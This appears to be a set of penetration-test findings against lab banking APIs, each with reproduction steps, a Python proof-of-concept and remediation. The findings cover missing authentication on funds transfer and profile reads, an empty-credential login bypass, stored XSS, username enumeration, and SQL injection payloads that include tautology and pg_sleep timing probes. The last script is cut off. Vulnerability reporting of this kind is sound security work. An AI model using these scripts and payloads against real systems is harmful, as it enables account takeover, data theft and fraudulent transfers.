title: Missing Authentication on Sensitive API Endpoints Enables Unauthenticated Data Access and Money Movement
description:
The API at `http://api.finance:3000` exposes multiple sensitive endpoints without requiring any authentication. Requests sent without an `Authorization` header were accepted and processed successfully on endpoints that expose user profile data, account balances, private support conversations, support-thread comment creation, and financial transfer functionality.

This issue is distinct from the previously validated authenticated object-level authorization weakness. Here, no valid session or bearer token is required at all. An unauthenticated external attacker can directly read highly sensitive financial and personal data and can also trigger state-changing operations.

Confirmed unauthenticated behaviors included:
- Reading full user profiles through `GET /user/profile/{id}`
- Reading account numbers and balances through `POST /bank/account`
- Reading private support conversations through `GET /support/conversation/{id}/comments`
- Posting comments into support threads through `POST /support/conversation/{id}/comment`
- Executing transfers through `POST /payment/transfer`

The profile response exposes especially sensitive fields, including plaintext passwords, account identifiers, account UUIDs, balances, and phone numbers.
evidence:
An unauthenticated attacker can obtain highly sensitive customer and administrative information, including usernames, plaintext passwords, phone numbers, account numbers, balances, and support conversation content.

The same attacker can also perform unauthorized state-changing actions without logging in:
- Inject comments into private support tickets
- Move funds between accounts when account numbers are known

Business impact includes account compromise through exposed plaintext credentials, privacy violations, disclosure of financial data, fraud risk through unauthorized transfers, and loss of integrity in support records. Because no authentication is required, the attack surface is internet-reachable and immediately exploitable.

The root cause is missing authentication enforcement on several sensitive API handlers. The application accepts requests without any bearer token and performs the requested action anyway.

Observed endpoint classes affected:
- Sensitive read endpoints
  - `GET /user/profile/{id}`
  - `POST /bank/account`
  - `GET /support/conversation/{id}/comments`
- Sensitive write endpoints
  - `POST /support/conversation/{id}/comment`
  - `POST /payment/transfer`

The vulnerability is systemic because it affects both confidentiality and integrity functions. In particular:
- `GET /user/profile/{id}` returns full records containing `password`, `accountUSD`, `uuidUSD`, `balanceUSD`, `accountEUR`, `uuidEUR`, `balanceEUR`, and `phoneNumber` without checking caller identity.
- `POST /bank/account` trusts a user-supplied `userID` and returns account details without requiring a token.
- `GET /support/conversation/{id}/comments` exposes private ticket content and existing comments to unauthenticated users.
- `POST /support/conversation/{id}/comment` allows arbitrary data injection into support records without authentication.
- `POST /payment/transfer` processes transfers without authentication when valid account numbers are supplied.

Independent validation confirmed that the missing-authentication issue is not limited to attacker-controlled test users. For example, unauthenticated access to `GET /user/profile/1` returned an administrative user record including the plaintext password `s3cureP@ssw0rd` and associated banking details.

This is a separate root cause from authenticated BOLA/IDOR. In this case, the application fails before authorization even begins: the endpoints do not enforce authentication at all.
steps:
To reproduce:

1. Register two ordinary users.
   - Send `POST /auth/register` twice to create two accounts.
   - Record the returned `userID` values.

2. Read profile data without authentication.
   - Send `GET /user/profile/{userID}` with no `Authorization` header.
   - Observe that the API returns the full user profile, including plaintext password, account numbers, account UUIDs, balances, and phone number.

3. Read another sensitive profile without authentication.
   - Send `GET /user/profile/1` with no `Authorization` header.
   - Observe that the API returns the profile for user 1, including username `superhacker`, plaintext password, financial identifiers, and phone number.

4. Read account details without authentication.
   - Send `POST /bank/account` with JSON body `{"userID": <target_user_id>}` and no `Authorization` header.
   - Observe that the API returns account numbers and balances.

5. Read and modify support data without authentication.
   - Send `GET /support/conversation/1/comments` with no `Authorization` header.
   - Observe that the private support thread content and comments are returned.
   - Send `POST /support/conversation/1/comment` with JSON body `{"comment":"unauth_report_marker_d8caca21"}` and no `Authorization` header.
   - Re-fetch `GET /support/conversation/1/comments` and observe the injected comment stored in the thread.

6. Perform an unauthenticated transfer.
   - Use the account numbers disclosed from unauthenticated profile responses.
   - Send `POST /payment/transfer` with no `Authorization` header and JSON body:
     `{"senderAccountNumber":"<user2 USD account>","recipientAccountNumber":"<user1 EUR account>","amount":5,"currencyFrom":"USD","currencyTo":"EUR","rate":1}`
   - Observe `200 {"message":"Transfer successful"}`.

7. Verify balance changes without authentication.
   - Send `POST /bank/account` for both affected users without authentication.
   - Observe the sender USD balance decreased and the recipient EUR balance increased.

Validation evidence from reproduction:
- Unauthenticated `GET /user/profile/1` returned:
  - `username: superhacker`
  - `password: s3cureP@ssw0rd`
  - account numbers, UUIDs, balances, and phone number
- Unauthenticated support comment injection persisted marker:
  - `unauth_report_marker_d8caca21`
- Unauthenticated transfer moved funds between two controlled users:
  - User 27 USD/EUR: `100/0` → `90/15`
  - User 28 USD/EUR: `100/0` → `95/0`

```
import random
import string
import requests

BASE = "http://api.finance:3000"


def req(method, path, **kwargs):
    return requests.request(method, f"{BASE}{path}", timeout=15, **kwargs)


def make_user():
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    return {
        "username": f"unauth_{suffix}",
        "firstname": "Unauth",
        "lastname": "Tester",
        "password": "Password123!"
    }


def register_user():
    user = make_user()
    r = req("POST", "/auth/register", json=user)
    r.raise_for_status()
    data = r.json()
    return user, data["userID"]


def main():
    user1, uid1 = register_user()
    user2, uid2 = register_user()

    print(f"[+] Created users: uid1={uid1}, uid2={uid2}")

    profile1 = req("GET", f"/user/profile/{uid1}")
    profile2 = req("GET", f"/user/profile/{uid2}")
    admin_profile = req("GET", "/user/profile/1")

    print("[+] Unauthenticated profile read (user1):", profile1.status_code, profile1.text)
    print("[+] Unauthenticated profile read (user2):", profile2.status_code, profile2.text)
    print("[+] Unauthenticated profile read (user 1):", admin_profile.status_code, admin_profile.text)

    p1 = profile1.json()
    p2 = profile2.json()

    acct1_before = req("POST", "/bank/account", json={"userID": uid1})
    acct2_before = req("POST", "/bank/account", json={"userID": uid2})
    print("[+] Unauthenticated account lookup user1:", acct1_before.status_code, acct1_before.text)
    print("[+] Unauthenticated account lookup user2:", acct2_before.status_code, acct2_before.text)

    thread_before = req("GET", "/support/conversation/1/comments")
    print("[+] Unauthenticated support thread read:", thread_before.status_code, thread_before.text)

    marker = "unauth_report_marker_d8caca21"
    comment_post = req("POST", "/support/conversation/1/comment", json={"comment": marker})
    print("[+] Unauthenticated support comment post:", comment_post.status_code, comment_post.text)

    thread_after = req("GET", "/support/conversation/1/comments")
    print("[+] Support thread after comment injection:", thread_after.status_code, thread_after.text)

    transfer_cross = req(
        "POST",
        "/payment/transfer",
        json={
            "senderAccountNumber": p2["accountUSD"],
            "recipientAccountNumber": p1["accountEUR"],
            "amount": 5,
            "currencyFrom": "USD",
            "currencyTo": "EUR",
            "rate": 1,
        },
    )
    print("[+] Unauthenticated cross-user transfer:", transfer_cross.status_code, transfer_cross.text)

    acct1_after = req("POST", "/bank/account", json={"userID": uid1})
    acct2_after = req("POST", "/bank/account", json={"userID": uid2})
    print("[+] User1 balances after transfer:", acct1_after.status_code, acct1_after.text)
    print("[+] User2 balances after transfer:", acct2_after.status_code, acct2_after.text)


if __name__ == "__main__":
    main()
```

metadata.remediation:
1. Enforce authentication on every sensitive API endpoint.
   Apply centralized authentication middleware to all profile, account, support, and transfer routes. Deny requests that do not present a valid bearer token.

2. Separate authentication from authorization.
   After enforcing authentication, validate that the authenticated subject is permitted to access or modify the requested resource. Do not trust user-supplied identifiers alone.

3. Remove plaintext password exposure immediately.
   Passwords must never be retrievable through any API response. Store passwords only as strong one-way hashes and remove the `password` field from all serialized responses.

4. Protect financial operations with strong server-side controls.
   Require authenticated identity, validate account ownership on the server, and verify that the source account belongs to the authenticated user before executing a transfer.

5. Protect support endpoints.
   Restrict read and write access to support conversations based on authenticated ownership or authorized support roles.

6. Add regression tests.
   Add negative test cases confirming that unauthenticated requests to sensitive endpoints consistently return `401 Unauthorized` or `403 Forbidden`.

7. Audit route registration and middleware application.
   Review all API handlers to ensure no sensitive route bypasses the intended authentication stack due to inconsistent router mounting or missing middleware.

8. Rotate exposed credentials and review impacted records.
   Because plaintext passwords and financial details were exposed, affected credentials should be invalidated and rotated, and a broader incident review should be performed.

title: Authentication Bypass in /auth/login via Empty Credentials
description:
The authentication endpoint accepts an empty username and empty password and issues a valid JSON Web Token (JWT) together with a user identifier. This behavior allows an unauthenticated external attacker to obtain an authenticated session without providing valid credentials.

The issue was confirmed by submitting a JSON body with both credential fields set to empty strings to the login endpoint. The server responded with HTTP 200 and returned a bearer token and `userID` value. The returned token was then used successfully against protected application functionality, confirming that the token is valid for authenticated API access.

This is an improper authentication vulnerability because the login flow does not correctly reject missing credentials before establishing an authenticated session.
evidence:
An unauthenticated attacker can gain immediate access to an authenticated user context without knowing any valid username or password.

Confirmed impact includes:
- Unauthorized acquisition of a valid bearer token
- Access to protected account data using the issued token
- Exposure of user profile and banking-related information associated with the authenticated session
- Ability to operate as the affected user for any additional API actions authorized to that account

In business terms, this weakness enables direct account compromise, unauthorized access to customer information, and a material increase in fraud and privacy risk.

The vulnerable behavior is exposed at `POST /auth/login`. The endpoint accepts a JSON request body containing `username` and `password`, but does not enforce a requirement that either field be populated with valid credentials before issuing a session token.

Observed behavior:
The request body `{"username":"","password":""}` returned HTTP 200 with a response containing:
- `message: "Login successful"`
- a JWT bearer token
- `userID: 3`

The returned token was validated by submitting it as a bearer token to protected endpoints. A request to `GET /user/profile/3` returned HTTP 200 and the profile data for the associated account. A request to `POST /bank/account` with body `{"userID":3}` and the same bearer token also returned HTTP 200 and account details.

These responses confirm that the application is not merely returning a malformed token-like string; it is issuing a server-accepted authenticated session tied to a real user record. The root cause is improper authentication logic in the login process, specifically failure to reject empty credential input prior to token issuance.
steps:
To reproduce:

1. Send the following request to the login endpoint:
   `POST http://api.finance:3000/auth/login`
   Header: `Content-Type: application/json`
   Body: `{"username":"","password":""}`

2. Observe that the server responds with HTTP 200 and returns a JSON object containing a bearer token and `userID`.

3. Copy the returned token from the login response.

4. Use the returned token in an authenticated request, for example:
   `GET http://api.finance:3000/user/profile/3`
   Header: `Authorization: Bearer <token>`

5. Observe that the protected endpoint responds with HTTP 200 and returns authenticated user data, proving that the empty-credential login resulted in a valid authenticated session.

Example validated response behavior:
- Login with empty credentials returned `{"message":"Login successful","token":"<JWT>","userID":3}`
- The returned token successfully accessed protected profile and account endpoints.

```
import requests

BASE = "http://api.finance:3000"

def main():
    login_resp = requests.post(
        f"{BASE}/auth/login",
        headers={"Content-Type": "application/json"},
        json={"username": "", "password": ""},
        timeout=10,
    )

    print("Login status:", login_resp.status_code)
    print("Login body:", login_resp.text)

    login_resp.raise_for_status()
    token = login_resp.json()["token"]

    profile_resp = requests.get(
        f"{BASE}/user/profile/3",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )

    print("Profile status:", profile_resp.status_code)
    print("Profile body:", profile_resp.text)

if __name__ == "__main__":
    main()
```

metadata.remediation:
1. Reject empty or missing credentials at the API boundary before any authentication logic is executed.
2. Enforce a strict authentication check that verifies the submitted username exists and the supplied password matches the stored credential for that user.
3. Ensure the login handler returns a uniform authentication failure response for invalid, empty, or malformed credentials.
4. Add server-side validation tests covering blank username, blank password, both fields blank, null values, and unexpected data types.
5. Review token issuance logic to confirm tokens are created only after successful credential verification.
6. Audit recent authentication events and investigate whether unauthorized sessions may already have been created through this flaw.

title: Stored XSS in Transaction History via Transfer Description
description:
A stored cross-site scripting vulnerability was confirmed in the banking application's transaction history workflow. The application accepts attacker-controlled HTML and JavaScript in the `description` field submitted to the money transfer function and persists that value with the transaction record. When the recipient later accesses the dashboard, the application retrieves the stored transaction data and renders the description into the transaction history view without safe output encoding.

This issue is cross-user and does not require the victim to perform any action beyond logging into the dashboard and loading their transaction history. In testing, a malicious transfer description submitted by one standard user executed automatically in a second user's browser session.
evidence: A low-privileged authenticated user can execute arbitrary JavaScript in another user's browser session. This enables theft of session material and JWTs, unauthorized actions on behalf of the victim, account takeover, and further compromise of sensitive banking functionality. Impact is amplified because the application stores JWTs in `localStorage`. During validation, the malicious payload successfully accessed the victim's stored token and exposed its prefix in the browser console, demonstrating a practical path to session theft and account compromise. In a real attack, the same technique could exfiltrate the full token to an attacker-controlled endpoint. The vulnerable flow begins at `POST /transfer`, where the application accepts a user-controlled `description` value and stores it with the transfer record. The recipient dashboard later loads transaction data from `GET /transactions/{account_number}` and renders each transaction description inside the transaction-history UI on `/dashboard`. Validation showed that the stored description is returned verbatim in the transaction API response and then inserted into the page as HTML rather than treated as plain text. As a result, attacker-supplied markup is interpreted by the browser and event handlers execute in the recipient's session context. The issue was validated with two separate payloads: - `` - `` Observed evidence: - A transfer from user `xssa8dba12eb` to user `xssb1765f921` was accepted successfully. - The recipient transaction API response included the malicious description unchanged. - When the recipient logged into the dashboard, the browser console recorded `XSSV_09bee141`. - A second payload recorded `TOK_4ea50d4b:eyJ0eXAiOiJKV1QiLCJhbGci`, proving execution in the victim session and access to the victim JWT stored in browser `localStorage`. This is a stored XSS vulnerability affecting a cross-user workflow with direct account takeover potential.
steps: To reproduce: 1. Register two standard user accounts and log in to obtain their account numbers. - Sender: `xssa8dba12eb` / `ValPass123!` - Recipient: `xssb1765f921` / `ValPass123!` 2. Submit a transfer from the sender account to the recipient account using a malicious description. Example payload: - `` 3. Confirm that the transfer succeeds. 4. Request the recipient transaction history: - `GET /transactions/9436548217` Observe that the JSON response contains the malicious description unchanged. 5. Log into the application as the recipient and open `/dashboard`. 6. Observe that the dashboard loads transaction history automatically and the payload executes in the recipient browser context. - Validation marker observed in console: `XSSV_09bee141` 7. For impact confirmation, repeat the transfer with a payload that reads the victim JWT from `localStorage`: - `` 8. Log in again as the recipient and load the dashboard. Observe the browser console: - `TOK_4ea50d4b:eyJ0eXAiOiJKV1QiLCJhbGci` This confirms stored cross-user script execution and access to victim session material. ``` import json import uuid import requests BASE = "http://bank:5000" def create_user(prefix: str): username = prefix + uuid.uuid4().hex[:8] password = "ValPass123!" session = requests.Session() reg = session.post( f"{BASE}/register", json={"username": username, "password": password}, timeout=10, ) login = session.post( f"{BASE}/login", json={"username": username, "password": password}, timeout=10, ) login.raise_for_status() login_data = login.json() return { "username": username, "password": password, "account_number": login_data["accountNumber"], "token": login_data["token"], "register_status": reg.status_code, "login_status": login.status_code, } def send_transfer(token: str, to_account: str, amount: str, description: str): headers = { "Authorization": f"Bearer {token}", "Content-Type": "application/json", } resp = requests.post( f"{BASE}/transfer", headers=headers, json={ "to_account": to_account, "amount": amount, "description": description, }, timeout=10, ) return resp def get_transactions(token: str, account_number: str): headers = {"Authorization": f"Bearer {token}"} resp = requests.get( f"{BASE}/transactions/{account_number}", headers=headers, timeout=10, ) return resp def main(): attacker = create_user("xssa") victim = create_user("xssb") marker = "XSSV_" + uuid.uuid4().hex[:8] payload = f'' transfer = send_transfer( attacker["token"], victim["account_number"], "1", payload, ) victim_tx = get_transactions(victim["token"], victim["account_number"]) print("Attacker:", attacker["username"], attacker["account_number"]) print("Victim:", victim["username"], victim["account_number"]) print("Payload:", payload) print("Transfer status:", transfer.status_code) print("Transfer body:", transfer.text) print("Victim transaction status:", victim_tx.status_code) body = victim_tx.text print("Payload stored in victim transaction response:", payload in body) print("Victim transaction response excerpt:") print(body[:1200]) print() print("Manual validation step:") print(f"1. Log into {BASE}/login as victim {victim['username']} / {victim['password']}") print("2. Open /dashboard") print(f"3. Observe browser console for marker: {marker}") if __name__ == "__main__": main() ```

metadata.remediation:
1. Eliminate unsafe HTML rendering in transaction history.
   Render transaction descriptions as plain text using safe DOM APIs such as `textContent` or equivalent framework-safe templating. Do not insert untrusted transaction data into `innerHTML`.

2. Apply context-appropriate output encoding everywhere untrusted content is displayed.
   Ensure all user-supplied fields, including transfer descriptions, bill descriptions, merchant names, and similar values, are encoded for the specific output context before rendering.

3. Sanitize rich text only if HTML is a strict business requirement.
   If formatted content must be supported, apply a robust HTML sanitizer with a minimal allowlist and remove all event handlers, scriptable URLs, and active content.

4. Reduce token exposure in the browser.
   Stop storing authentication tokens in `localStorage`. Move session handling to `HttpOnly`, `Secure`, `SameSite` cookies so successful XSS cannot directly read bearer tokens from JavaScript.

5. Deploy defense-in-depth browser controls.
   Implement a strict Content Security Policy that disallows inline script and restricts script sources. This will reduce exploit reliability if a rendering flaw reappears elsewhere.

6. Review adjacent sinks for the same pattern.
   Audit all dashboard rendering logic that inserts transaction descriptions, payment descriptions, merchant data, profile-related content, or AI output into HTML. The same unsafe pattern may affect multiple workflows.

7. Retest after remediation.
   Verify that malicious descriptions are displayed as inert text, that no JavaScript executes in recipient sessions, and that tokens are no longer accessible from browser script.

title: Unauthenticated Username Enumeration in Password Reset Endpoint
description:
The password-reset workflow exposes a reliable account enumeration vulnerability in the unauthenticated endpoint `POST /api/v2/forgot-password`.

When a valid username is submitted, the application returns HTTP 200 with a success response indicating that a reset PIN has been sent. When an invalid username is submitted, the application returns HTTP 404 with an explicit `User not found` error. This discrepancy is externally observable without authentication and allows an attacker to distinguish valid accounts from invalid ones with high confidence.

The issue was confirmed using a freshly created test account and multiple random nonexistent usernames over repeated requests. The behavior was deterministic across all trials and did not depend on timing analysis alone; the status code and response body were sufficient to enumerate accounts.
evidence:
An unauthenticated attacker can harvest valid usernames for the banking application at scale.

This materially increases the likelihood of follow-on attacks, including password spraying, credential stuffing, targeted phishing, social engineering, and focused abuse of the password-reset process. In this application, the risk is elevated because valid-account discovery can be chained with weaknesses in the reset workflow to accelerate account takeover attempts.

The root cause is inconsistent response handling for account existence checks in the password-reset flow. The endpoint discloses whether a supplied username exists by returning different HTTP status codes and different JSON bodies depending on the lookup result.

Observed behavior:
For a valid username, the endpoint returned HTTP 200 and a success body containing `status: success` and a message that a reset PIN had been sent.
For invalid usernames, the endpoint returned HTTP 404 and a body containing `status: error` and `message: User not found`.

Because these differences are explicit and stable, an attacker does not need to rely on subtle timing analysis or side channels. The endpoint can be used directly as an oracle for account existence.

Validation evidence:
A freshly registered valid username, `enumvalidhy8h4c4e`, returned HTTP 200 with the following body across 20 out of 20 requests:

`{"debug_info":{"timestamp":"2026-04-19 22:31:46.225154","username":"enumvalidhy8h4c4e"},"message":"Reset PIN has been sent to your email.","status":"success"}`

Average response time for the valid username was 4.095 ms.

Three random nonexistent usernames, `nousero3llikd0`, `nouserpbfc8b8i`, and `nouser2ehckfa9`, each returned HTTP 404 with the following body across 10 out of 10 requests each:

`{"message":"User not found","status":"error"}`

Average response times for the nonexistent usernames were 3.29 ms, 3.044 ms, and 3.742 ms respectively.

The vulnerability is therefore a reliable, content-based and status-based enumeration issue.
steps:
To reproduce:

1. Register a new account or use any known valid username in the application.
2. Send an unauthenticated `POST` request to `/api/v2/forgot-password` with JSON body `{"username":"<valid_username>"}`.
3. Observe that the endpoint returns HTTP 200 and a success message indicating that a reset PIN has been sent.
4. Repeat the request with a random nonexistent username.
5. Observe that the endpoint returns HTTP 404 and the message `User not found`.
6. Repeat the test multiple times to confirm that the difference is deterministic and reliable.

A valid username can therefore be distinguished from an invalid one without authentication.

```
import random
import string
import time
import statistics
import requests

BASE = "http://bank:5000"


def randname(prefix="enum"):
    return prefix + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def register_user(username: str, password: str) -> None:
    response = requests.post(
        f"{BASE}/register",
        json={"username": username, "password": password},
        timeout=10,
    )
    print("Register:", response.status_code, username)


def probe(username: str, count: int):
    results = []
    for _ in range(count):
        start = time.time()
        response = requests.post(
            f"{BASE}/api/v2/forgot-password",
            json={"username": username},
            timeout=10,
        )
        elapsed_ms = (time.time() - start) * 1000
        results.append(
            {
                "status": response.status_code,
                "body": response.text.strip(),
                "time_ms": round(elapsed_ms, 3),
            }
        )
    return results


def summarize(label: str, results):
    statuses = sorted(set(item["status"] for item in results))
    avg_ms = round(statistics.mean(item["time_ms"] for item in results), 3)
    sample_body = results[0]["body"]
    print(f"== {label} ==")
    print("Statuses:", statuses)
    print("Average ms:", avg_ms)
    print("Sample body:", sample_body)
    print()


def main():
    valid_user = randname("enumvalid")
    valid_pass = "StartPass123!"
    register_user(valid_user, valid_pass)

    invalid_users = [randname("nouser") for _ in range(3)]

    valid_results = probe(valid_user, 20)
    summarize(f"valid user {valid_user}", valid_results)

    for invalid in invalid_users:
        invalid_results = probe(invalid, 10)
        summarize(f"invalid user {invalid}", invalid_results)


if __name__ == "__main__":
    main()
```

metadata.remediation:
1. Return the same HTTP status code for both existing and non-existing usernames in the password-reset workflow.
2. Return a generic response message such as `If the account exists, reset instructions have been sent`.
3. Remove any debug fields or account-related metadata from unauthenticated reset responses.
4. Apply consistent response structure and comparable processing time for both valid and invalid usernames to reduce side-channel leakage.
5. Add monitoring and rate limiting for repeated password-reset requests to reduce large-scale enumeration attempts.
6. Review other authentication and recovery endpoints for similar existence-disclosure behavior.

title: SQL Injection in Forgot Password Endpoint Enables Arbitrary Reset Initiation
description:
A SQL injection vulnerability was confirmed in the forgot password endpoint at `POST /api/v2/forgot-password`. The endpoint accepts a JSON `username` field and incorporates that value into a PostgreSQL query without safe parameterization.

The vulnerability allows an unauthenticated attacker to alter the logic of the user lookup performed during password reset initiation. By injecting SQL operators and comments into the `username` value, the application can be coerced into treating arbitrary existing accounts as valid reset targets. This behavior was confirmed against ordinary user accounts and the administrative account.

The endpoint also exposes raw database error messages when malformed input is supplied, which further confirms unsafe SQL construction and discloses backend implementation details.
evidence:
The issue allows an unauthenticated attacker to manipulate the password reset initiation workflow for arbitrary existing accounts, including administrative users.

Confirmed business impact includes:
- Forced initiation of password reset for accounts the attacker does not control
- Reliable inference of whether specific accounts exist based on response differences
- Exposure of backend database behavior and query construction through raw PostgreSQL errors
- A practical pathway toward account takeover when combined with weak downstream reset controls such as guessable reset codes, insufficient rate limiting, or weak reset verification logic

Because this behavior is reachable without authentication and affects privileged accounts, it materially increases the risk of targeted account compromise.

The vulnerable behavior occurs in the forgot password initiation flow, where the supplied `username` is used in a backend lookup consistent with a query shape such as:

`SELECT id FROM users WHERE username='[user input]'`

The following behaviors were confirmed:

Overview
A malformed quote in the `username` value caused a database error, demonstrating direct influence over SQL syntax. Boolean payloads altered application behavior, and time-based PostgreSQL payloads produced measurable server delays. Together, these establish exploitable SQL injection in the endpoint.

Severity and CVSS
High severity.
CVSS: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

Affected asset(s)
- `http://bank:5000`
- Endpoint: `POST /api/v2/forgot-password`

Technical details
A single quote payload returned an HTTP 500 response with a raw PostgreSQL error indicating an unterminated quoted string during a query against the `users` table.
A nonexistent username returned HTTP 404 with a “User not found” response.
A nonexistent username followed by a tautology payload returned HTTP 200 with a success message indicating that a reset PIN had been sent.
A false boolean condition returned HTTP 404 again, proving that response behavior is controlled by injected SQL logic.
A targeted boolean condition referencing `username='admin'` returned HTTP 200 success, demonstrating that reset initiation can be directed at the administrative account.
A PostgreSQL `pg_sleep(2)` payload caused an approximately two-second delay while maintaining the expected error-path outcome, confirming executable time-based injection.

These observations demonstrate that the endpoint is not merely error-prone but exploitable for controlled boolean and timing-based inference, as well as reset-workflow abuse against arbitrary users.
steps:
To reproduce:

1. Send a baseline request for a clearly nonexistent username.
   - Request body:
     `{"username":"noexist_example_user"}`
   - Expected result:
     HTTP 404 with a response indicating the user was not found.

2. Send a malformed quote payload to confirm unsafe SQL construction.
   - Request body:
     `{"username":"'"}`
   - Expected result:
     HTTP 500 with a PostgreSQL error indicating an unterminated quoted string.

3. Send a tautology payload using a nonexistent prefix.
   - Request body:
     `{"username":"noexist_example_user' OR '1'='1' -- "}`
   - Expected result:
     HTTP 200 with a response indicating that a reset PIN has been sent.

4. Send a false condition to prove boolean control.
   - Request body:
     `{"username":"noexist_example_user' AND '1'='2' -- "}`
   - Expected result:
     HTTP 404 with a response indicating the user was not found.

5. Send a targeted condition for a known account such as the administrative user.
   - Request body:
     `{"username":"noexist_example_user' OR username='admin' -- "}`
   - Expected result:
     HTTP 200 with a success response, showing that the application treats the administrative account as the reset target.

6. Send a time-based PostgreSQL payload.
   - Request body:
     `{"username":"'||(SELECT CASE WHEN 1=1 THEN pg_sleep(2) END)||'"}`
   - Expected result:
     The response time increases by roughly two seconds compared with a normal nonexistent-username request, confirming executable SQL injection.

```
import json
import time
import requests

BASE_URL = "http://bank:5000"
ENDPOINT = f"{BASE_URL}/api/v2/forgot-password"
HEADERS = {"Content-Type": "application/json"}

PAYLOADS = [
    ("baseline_missing", {"username": "noexist_example_user"}),
    ("error_quote", {"username": "'"}),
    ("boolean_true", {"username": "noexist_example_user' OR '1'='1' -- "}),
    ("boolean_false", {"username": "noexist_example_user' AND '1'='2' -- "}),
    ("target_admin", {"username": "noexist_example_user' OR username='admin' -- "}),
    ("time_based", {"username": "'||(SELECT CASE WHEN 1=1 THEN pg_sleep(2) END)||'"}),
]

def send(payload):
    start = time.time()
    response = requests.post(
        ENDPOINT,
        headers=HEADERS,
        data=json.dumps(payload),
        timeout=10,
    )
    elapsed = time.time() - start
    try:
        body = response.json()
    except Exception:
        body = response.text
    return response.status_code, elapsed, body

def main():
    print(f"Testing {ENDPOINT}")
    for label, payload in PAYLOADS:
        status, elapsed, body = send(payload)
        print("=" * 80)
        print(f"Test: {label}")
        print(f"Payload: {payload}")
        print(f"Status: {status}")
        print(f"Elapsed: {elapsed:.3f}s")
        print("Response:")
        print(body)

if __name__ == "__main__":
    main()
```

metadata.remediation:
1. Replace dynamic SQL with parameterized queries for all username lookups in the password reset workflow.
   - User-supplied values must never be concatenated into SQL strings.

2. Remove raw database error disclosure from HTTP responses.
   - Return only generic application errors to the client.
   - Log detailed exceptions server-side for investigation.

3. Normalize forgot password responses.
   - Return the same generic message for both existing and nonexistent users to prevent account enumeration and boolean inference.

4. Review the entire password reset workflow for chained abuse.
   - Verify that reset codes are sufficiently strong.
   - Enforce strict rate limiting and lockout controls.
   - Ensure reset initiation alone cannot be abused to compromise accounts.

5. Perform a broader review of the application for similar SQL construction patterns.
   - This issue indicates unsafe query handling that may affect other authentication and account-related endpoints.

6. Retest the endpoint after remediation using malformed, boolean, and time-based payloads to confirm that no SQL execution or response differentiation remains.

title: SQL Injection in Forgot-Password Endpoints Enables Unauthenticated Reset Workflow Manipulation
description:
A SQL injection vulnerability was confirmed in the unauthenticated forgot-password functionality exposed through `POST /api/v1/forgot-password` and `POST /api/v2/forgot-password`.

The `username` value is incorporated into a backend SQL query without safe parameterization. Supplying a single quote produces database parser errors, and boolean conditions alter application behavior in a predictable and reproducible way. Specifically, a nonexistent username combined with a true predicate causes the application to behave as though a valid account was found, while the same request with a false predicate returns the normal “User not found” response.

Version `v1` further increases impact by returning a generated reset PIN in the `debug_info` object whenever the injected request is treated as successful. Version `v2` remains injectable but does not disclose the PIN in the response.

A controlled victim account was created during validation to test downstream abuse. The normal v1 reset flow worked as expected for that controlled account. However, the PIN returned by an injected v1 request was not accepted by the reset endpoint for the targeted account under the tested conditions, so full unauthorized password reset was not confirmed during this assessment.
evidence:
An unauthenticated attacker can manipulate password-reset request logic without a valid username match, trigger successful reset-request processing through injected predicates, and obtain generated reset PIN values from the v1 endpoint response.

This undermines the integrity of the account recovery workflow and exposes sensitive authentication-recovery data. The issue also discloses backend SQL error details that assist further exploitation and removes the normal distinction between valid and invalid reset requests through query manipulation.

Although direct account takeover through the reset endpoint was not confirmed during testing, the vulnerability still represents a high-risk weakness in a security-critical authentication workflow and may enable additional abuse if combined with related flaws in reset handling, debugging, or session management.

The vulnerable behavior is consistent with direct string interpolation of the supplied `username` into a SQL statement similar to:

`SELECT id FROM users WHERE username='[user input]'`

Error-based confirmation was obtained on both endpoint versions by sending a trailing single quote in the `username` field. Each endpoint returned a 500 response containing a PostgreSQL parser error indicating an unterminated quoted string.

Boolean-based confirmation was obtained using a nonexistent username with true and false predicates:
`doesnotexist_fp' OR '1'='1`
and
`doesnotexist_fp' OR '1'='2`

For both `v1` and `v2`, the true predicate returned HTTP 200 with the message `Reset PIN has been sent to your email.`, while the false predicate returned HTTP 404 with `User not found`. This differential behavior confirms that attacker-supplied SQL conditions influence the server-side query result.

The `v1` endpoint additionally returned a generated three-digit reset PIN in `debug_info.pin` for successful injected requests, creating direct exposure of authentication-recovery material. The `v2` endpoint returned the same success/failure differential but omitted the PIN value.

A targeted predicate against a controlled account also returned a PIN value in `v1`. However, that injected-request PIN was not accepted by the reset endpoint for the targeted account, while the normal non-injected forgot-password flow produced a PIN that was accepted successfully. This shows the SQL injection is real and exploitable in the request phase, while downstream password-reset completion was not fully demonstrated for the injected PIN path.
steps:
To reproduce:

1. Send a baseline request with a nonexistent username to confirm normal behavior:
   `POST /api/v1/forgot-password`
   Body: `{"username":"doesnotexist_fp"}`
   Expected result: HTTP 404 with `User not found`.

2. Send an error-based SQL injection probe:
   `POST /api/v1/forgot-password`
   Body: `{"username":"doesnotexist_fp'"}`
   Expected result: HTTP 500 with a PostgreSQL error indicating an unterminated quoted string.

3. Send a boolean-true payload:
   `POST /api/v1/forgot-password`
   Body: `{"username":"doesnotexist_fp' OR '1'='1"}`
   Expected result: HTTP 200 with `Reset PIN has been sent to your email.`  
   On `v1`, the response also includes `debug_info.pin`.

4. Send the matching boolean-false control:
   `POST /api/v1/forgot-password`
   Body: `{"username":"doesnotexist_fp' OR '1'='2"}`
   Expected result: HTTP 404 with `User not found`.

5. Repeat steps 1 through 4 against `POST /api/v2/forgot-password`.
   Expected result: the same error-based and boolean-based differential behavior confirms SQL injection in `v2` as well, although `v2` does not expose the PIN value.

6. Optional validation of workflow impact:
   Create a controlled user account, verify that the normal v1 forgot-password flow returns a PIN that can be used successfully with `/api/v1/reset-password`, then compare that behavior with a PIN returned from an injected request. During testing, the injected-request PIN was disclosed but was not accepted by the reset endpoint for the targeted account.

```
import json
import time
import requests

BASE = "http://bank:5000"


def post_json(path, payload):
    resp = requests.post(f"{BASE}{path}", json=payload, timeout=15)
    try:
        data = resp.json()
    except Exception:
        data = {"raw": resp.text}
    return resp.status_code, data


def show(label, path, payload):
    status, data = post_json(path, payload)
    print("=" * 80)
    print(label)
    print("PATH:", path)
    print("PAYLOAD:", json.dumps(payload))
    print("STATUS:", status)
    print(json.dumps(data, indent=2)[:1200])
    return status, data


def main():
    baseline = {"username": "doesnotexist_fp"}
    error_probe = {"username": "doesnotexist_fp'"}
